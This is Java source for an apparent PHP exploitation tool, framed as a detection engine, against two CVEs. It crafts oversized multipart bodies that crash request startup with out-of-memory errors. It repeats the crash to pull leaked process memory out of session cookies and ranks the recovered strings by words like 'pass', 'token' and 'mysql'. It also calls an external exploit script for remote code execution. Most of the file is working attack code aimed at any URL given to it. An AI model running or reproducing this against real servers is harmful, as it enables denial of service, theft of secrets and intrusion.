package p2s;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.*;

/**
 * PHP2Shell 检测引擎（CVE-2026-109618 / CVE-2026-109619）
 *
 * 三级内置检测：
 *   L1 指纹   —— 读 banner 判版本是否低于修复版
 *   L2 触发   —— 发 multipart 让目标在请求启动期 OOM（判据 "in Unknown on line 0"）
 *   L3 泄漏   —— 干净 worker 的 cookie vs abort 后同一 worker 的 cookie
 * L4 RCE 需外部全链载荷（本工具通过 ProcessBuilder 调 python exploit.py）。
 */
public final class Probe {

    public static final String SID = "php2shelllab0123456789abcdef01";
    public static final String BOUNDARY = "---------------------------p2sjava";
    public static final String[] LEVELS = {"fingerprint", "trigger", "leak", "rce"};

    private static final Map<String, Integer> FIXED = Map.of(
            "8.2", 35, "8.3", 36, "8.4", 27, "8.5", 12);

    /* ----------------------------- 结果模型 ----------------------------- */
    public static class Resp {
        public int status;
        public byte[] body = new byte[0];
        public final Map<String, List<String>> headers = new LinkedHashMap<>();

        public String header(String name) {
            for (var e : headers.entrySet()) {
                // HttpURLConnection 的 header map 里有一条 key=null（状态行），必须跳过
                if (e.getKey() != null && e.getKey().equalsIgnoreCase(name) && !e.getValue().isEmpty())
                    return e.getValue().get(0);
            }
            return null;
        }

        public List<String> headers(String name) {
            List<String> out = new ArrayList<>();
            for (var e : headers.entrySet()) {
                if (e.getKey() != null && e.getKey().equalsIgnoreCase(name)) out.addAll(e.getValue());
            }
            return out;
        }

        public String text() { return new String(body, StandardCharsets.ISO_8859_1); }
    }

    public static class Fingerprint {
        public boolean ok; public String version = ""; public String verdict = ""; public String note = "";
        public String server = ""; public int http;
    }

    public static class Trigger {
        public boolean hit; public String fatal = ""; public Boolean aliveAfter = null;
        public double seconds; public String note = "";
    }

    public static class Leak {
        public String verdict = "no-signal"; public String control = null;
        public final List<String> samples = new ArrayList<>();
        public int decodedLen; public final List<String> strings = new ArrayList<>();
        public String note = "";
    }

    public static class Rce {
        public boolean hit; public boolean ok; public String detail = ""; public double seconds;
    }

    public static class Result {
        public String url, ts;
        public Fingerprint fp; public Trigger tr; public Leak lk; public Rce rc;
        public double wall; public String error;
    }

    /* ------------------------------ HTTP ------------------------------ */
    private static HttpURLConnection open(String url, String method, Integer timeoutMs) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestMethod(method);
        c.setConnectTimeout(timeoutMs == null ? 8000 : timeoutMs);
        c.setReadTimeout(timeoutMs == null ? 15000 : timeoutMs);
        c.setInstanceFollowRedirects(true);
        c.setRequestProperty("User-Agent", "p2s-jar/1.0 (authorised assessment)");
        c.setRequestProperty("Accept", "*/*");
        c.setRequestProperty("Connection", "close");
        return c;
    }

    private static Resp read(HttpURLConnection c) throws IOException {
        Resp r = new Resp();
        r.status = c.getResponseCode();
        r.headers.putAll(c.getHeaderFields());
        InputStream in = r.status >= 400 ? c.getErrorStream() : c.getInputStream();
        if (in != null) {
            try (in; ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
                byte[] buf = new byte[65536];
                int n;
                while ((n = in.read(buf)) > 0 && bos.size() < (16 << 20)) bos.write(buf, 0, n);
                r.body = bos.toByteArray();
            }
        }
        return r;
    }

    public static Resp get(String url, int timeoutMs) throws IOException {
        return read(open(url, "GET", timeoutMs));
    }

    public static Resp post(String url, byte[] body, String contentType, int timeoutMs) throws IOException {
        HttpURLConnection c = open(url, "POST", timeoutMs);
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", contentType);
        c.setFixedLengthStreamingMode(body.length);
        try (OutputStream os = c.getOutputStream()) { os.write(body); }
        return read(c);
    }

    /* --------------------------- 请求体构造 --------------------------- */
    private static void part(ByteArrayOutputStream out, String headers, byte[] data) throws IOException {
        out.write(("--" + BOUNDARY + "\r\n" + headers + "\r\n\r\n").getBytes(StandardCharsets.ISO_8859_1));
        out.write(data);
        out.write("\r\n".getBytes(StandardCharsets.ISO_8859_1));
    }

    /** L2 用的触发体：先发布 PS(id)（小文件 part），再用巨大字段名把解析打崩。 */
    public static byte[] abortBody(int nameLen) throws IOException {
        ByteArrayOutputStream o = new ByteArrayOutputStream(4 << 20);
        part(o, "Content-Disposition: form-data; name=\"PHPSESSID\"", SID.getBytes(StandardCharsets.ISO_8859_1));
        part(o, "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"",
                "k".getBytes(StandardCharsets.ISO_8859_1));
        part(o, "Content-Disposition: form-data; name=\"ok\"; filename=\"ok.txt\"\r\nContent-Type: text/plain",
                "x".getBytes(StandardCharsets.ISO_8859_1));
        o.write(("--" + BOUNDARY + "\r\nContent-Disposition: form-data; name=\"").getBytes(StandardCharsets.ISO_8859_1));
        o.write("A".repeat(nameLen).getBytes(StandardCharsets.ISO_8859_1));
        o.write("\"; filename=\"".getBytes(StandardCharsets.ISO_8859_1));
        o.write("B".repeat(nameLen).getBytes(StandardCharsets.ISO_8859_1));
        o.write("\"\r\nContent-Type: text/plain\r\n\r\nxxxx\r\n".getBytes(StandardCharsets.ISO_8859_1));
        o.write(("--" + BOUNDARY + "--\r\n").getBytes(StandardCharsets.ISO_8859_1));
        return o.toByteArray();
    }

    /** L3 用的"清理形"请求：有 PHPSESSID + 进度键，但没有 file part。 */
    public static byte[] cleanupBody() throws IOException {
        ByteArrayOutputStream o = new ByteArrayOutputStream(4096);
        part(o, "Content-Disposition: form-data; name=\"PHPSESSID\"", SID.getBytes(StandardCharsets.ISO_8859_1));
        part(o, "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"",
                "k".getBytes(StandardCharsets.ISO_8859_1));
        o.write(("--" + BOUNDARY + "--\r\n").getBytes(StandardCharsets.ISO_8859_1));
        return o.toByteArray();
    }

    /* ----------------------------- L1 指纹 ----------------------------- */
    public static Fingerprint fingerprint(String url, int timeoutMs) {
        Fingerprint f = new Fingerprint();
        try {
            Resp r = get(url, Math.min(timeoutMs, 15000));
            f.http = r.status;
            f.server = r.header("Server");
            String body = r.text();
            if (body.length() > 8192) body = body.substring(0, 8192);
            String hay = String.valueOf(r.header("X-Powered-By")) + " " + String.valueOf(f.server) + " " + body;
            Matcher m = Pattern.compile("PHP/(\\d+)\\.(\\d+)\\.(\\d+)").matcher(hay);
            if (m.find()) {
                f.version = "PHP/" + m.group(1) + "." + m.group(2) + "." + m.group(3);
                int maj = Integer.parseInt(m.group(1)), min = Integer.parseInt(m.group(2)), pat = Integer.parseInt(m.group(3));
                Integer fixed = FIXED.get(maj + "." + min);
                if (fixed == null) {
                    if (maj == 8 && min < 2 || maj < 8) {
                        f.verdict = "vulnerable";
                        f.note = "低于维护分支：无上游修复，需厂商回移";
                    } else {
                        f.verdict = "unknown-branch";
                        f.note = "高于本工具版本表（" + maj + "." + min + "）";
                    }
                } else if (pat < fixed) {
                    f.verdict = "vulnerable";
                    f.note = "PHP " + maj + "." + min + "." + pat + " < " + maj + "." + min + "." + fixed;
                } else {
                    f.verdict = "patched";
                    f.note = "PHP " + maj + "." + min + "." + pat + " >= " + maj + "." + min + "." + fixed;
                }
            } else {
                f.verdict = "unknown";
                f.note = "无 PHP/x.y.z banner（expose_php=Off、CDN 或非 PHP）";
            }
            f.ok = true;
        } catch (Exception e) {
            f.note = "不可达: " + e.getClass().getSimpleName();
        }
        return f;
    }

    /* ----------------------------- L2 触发 ----------------------------- */
    public static boolean alive(String url) {
        try {
            Resp r = get(url, 8000);
            return r.status >= 200 && r.status < 600;
        } catch (Exception e) {
            return false;
        }
    }

    public static Trigger trigger(String url, int timeoutMs) {
        Trigger t = new Trigger();
        long t0 = System.nanoTime();
        try {
            byte[] body = abortBody(2 << 20);
            Resp r = post(url, body, "multipart/form-data; boundary=" + BOUNDARY, timeoutMs);
            for (String line : r.text().split("\\R")) {
                if (line.contains("in Unknown on line 0")) {
                    t.hit = true;
                    t.fatal = line.trim();
                    break;
                }
            }
            if (!t.hit) t.note = "未见启动期 OOM（限制不同、body 被截断或被 WAF 拦）";
        } catch (Exception e) {
            t.note = "传输中断: " + e.getClass().getSimpleName();
        }
        t.seconds = (System.nanoTime() - t0) / 1e9;
        t.aliveAfter = alive(url);
        return t;
    }

    /* ----------------------------- L3 泄漏 ----------------------------- */
    private static String firstCookie(Resp r) {
        for (String c : r.headers("Set-Cookie")) {
            if (c == null) continue;
            String s = c.trim();
            if (s.regionMatches(true, 0, "PHPSESSID=", 0, 10)) {
                String v = s.substring(10);
                int semi = v.indexOf(';');
                return semi >= 0 ? v.substring(0, semi) : v;
            }
        }
        return null;
    }

    private static boolean looksLikeSessionId(String v) {
        if (v == null || v.isEmpty() || v.contains("%")) return false;
        return v.length() >= 22 && v.length() <= 256 && v.matches("[A-Za-z0-9,+\\-]+");
    }

    public static Leak leak(String url, int rounds, int timeoutMs) {
        Leak lk = new Leak();
        try {
            Resp ctl = post(url, cleanupBody(), "multipart/form-data; boundary=" + BOUNDARY, timeoutMs);
            lk.control = firstCookie(ctl);
        } catch (Exception e) {
            lk.verdict = "error";
            lk.note = "对照请求失败: " + e.getClass().getSimpleName();
            return lk;
        }
        for (int i = 0; i < Math.max(1, rounds); i++) {
            try {
                post(url, abortBody(2 << 20), "multipart/form-data; boundary=" + BOUNDARY, timeoutMs);
            } catch (Exception e) {
                lk.verdict = "corruption-or-exit";
                break;
            }
            if (!alive(url)) { lk.verdict = "corruption-or-exit"; break; }
            String after;
            try {
                Resp r = post(url, cleanupBody(), "multipart/form-data; boundary=" + BOUNDARY, timeoutMs);
                after = firstCookie(r);
            } catch (Exception e) {
                lk.verdict = "corruption-or-exit";
                break;
            }
            lk.samples.add(after);
            if (after != null && !looksLikeSessionId(after)) {
                byte[] raw = URLDecoder.decode(after, StandardCharsets.ISO_8859_1).getBytes(StandardCharsets.ISO_8859_1);
                lk.decodedLen = raw.length;
                lk.strings.addAll(printable(raw));
                lk.verdict = "leak";
                break;
            }
            if (!Objects.equals(after, lk.control)) lk.verdict = "differential";
        }
        return lk;
    }

    private static List<String> printable(byte[] raw) {
        List<String> out = new ArrayList<>();
        StringBuilder sb = new StringBuilder();
        for (byte b : raw) {
            int c = b & 0xff;
            if (c >= 32 && c < 127) sb.append((char) c);
            else { if (sb.length() >= 4) out.add(sb.toString()); sb.setLength(0); }
        }
        if (sb.length() >= 4) out.add(sb.toString());
        out.sort((a, b) -> Integer.compare(score(b), score(a)));
        return out.size() > 6 ? out.subList(0, 6) : out;
    }

    private static int score(String s) {
        String l = s.toLowerCase();
        int n = 0;
        for (String w : new String[]{"pass", "secret", "token", "key", "api", "auth", "session", "root", "mysql"}) {
            if (l.contains(w)) n++;
        }
        return n;
    }

    /* ------------------------------ L4 RCE ------------------------------ */
    public static Rce rce(String url, String python, String exploit, int timeoutSec) {
        Rce r = new Rce();
        File ex = new File(exploit == null ? "" : exploit);
        if (!ex.isFile()) {
            r.detail = "未配置全链载荷（exploit.py）。L4 需外部载荷，本工具不内置。";
            return r;
        }
        URI u = URI.create(url);
        int port = u.getPort() > 0 ? u.getPort() : ("https".equals(u.getScheme()) ? 443 : 80);
        List<String> cmd = new ArrayList<>(List.of(python, "-X", "utf8", ex.getAbsolutePath(),
                "--host", u.getHost(), "--port", String.valueOf(port),
                "--path", u.getPath() == null || u.getPath().isEmpty() ? "/index.php" : u.getPath(),
                "--sleep-oracle", "--timeout", String.valueOf(Math.min(60, timeoutSec))));
        if ("https".equals(u.getScheme())) cmd.add("--https");
        long t0 = System.nanoTime();
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd).redirectErrorStream(true);
            pb.environment().put("PYTHONIOENCODING", "utf-8");
            Process p = pb.start();
            StringBuilder sb = new StringBuilder();
            try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = br.readLine()) != null) sb.append(line).append('\n');
            }
            p.waitFor();
            String out = sb.toString();
            r.ok = true;
            Matcher m = Pattern.compile("RCE\\s+·\\s+r0 = (0x[0-9a-fA-F]+)").matcher(out);
            if (m.find()) {
                r.hit = true;
                r.detail = "命中 r0=" + m.group(1);
            } else if (out.contains("leak failed")) {
                r.detail = "泄漏阶段失败：目标构建/配置与载荷不匹配（不等于没有漏洞）";
            } else if (out.contains("no r0 in the swept range")) {
                r.detail = "泄漏成功但 r0 未命中：扩大扫描范围";
            } else {
                String[] lines = out.strip().split("\\R");
                r.detail = lines.length > 0 ? lines[lines.length - 1] : "无输出";
            }
        } catch (Exception e) {
            r.detail = "调用载荷失败: " + e.getClass().getSimpleName();
        }
        r.seconds = (System.nanoTime() - t0) / 1e9;
        return r;
    }

    /* ----------------------------- 目标规范化 ----------------------------- */
    public static String normalize(String raw) {
        if (raw == null) return "";
        String s = raw.trim();
        if (s.isEmpty() || s.startsWith("#")) return "";
        if (!s.contains("://")) s = "http://" + s;
        String afterScheme = s.substring(s.indexOf("://") + 3);
        if (!afterScheme.contains("/")) s = s + "/index.php";
        return s;
    }

    public static Result probe(String url, Set<String> levels, int rounds, int timeoutSec) {
        Result r = new Result();
        r.url = url;
        r.ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
        long t0 = System.nanoTime();
        if (levels.contains("fingerprint")) r.fp = fingerprint(url, timeoutSec * 1000);
        if (levels.contains("trigger")) r.tr = trigger(url, timeoutSec * 1000);
        if (levels.contains("leak")) r.lk = leak(url, rounds, timeoutSec * 1000);
        if (levels.contains("rce")) {
            String python = System.getProperty("p2s.python", "python");
            String exploit = System.getProperty("p2s.exploit", "");
            r.rc = rce(url, python, exploit, Math.max(120, timeoutSec));
        }
        r.wall = (System.nanoTime() - t0) / 1e9;
        return r;
    }

    private Probe() {}
}
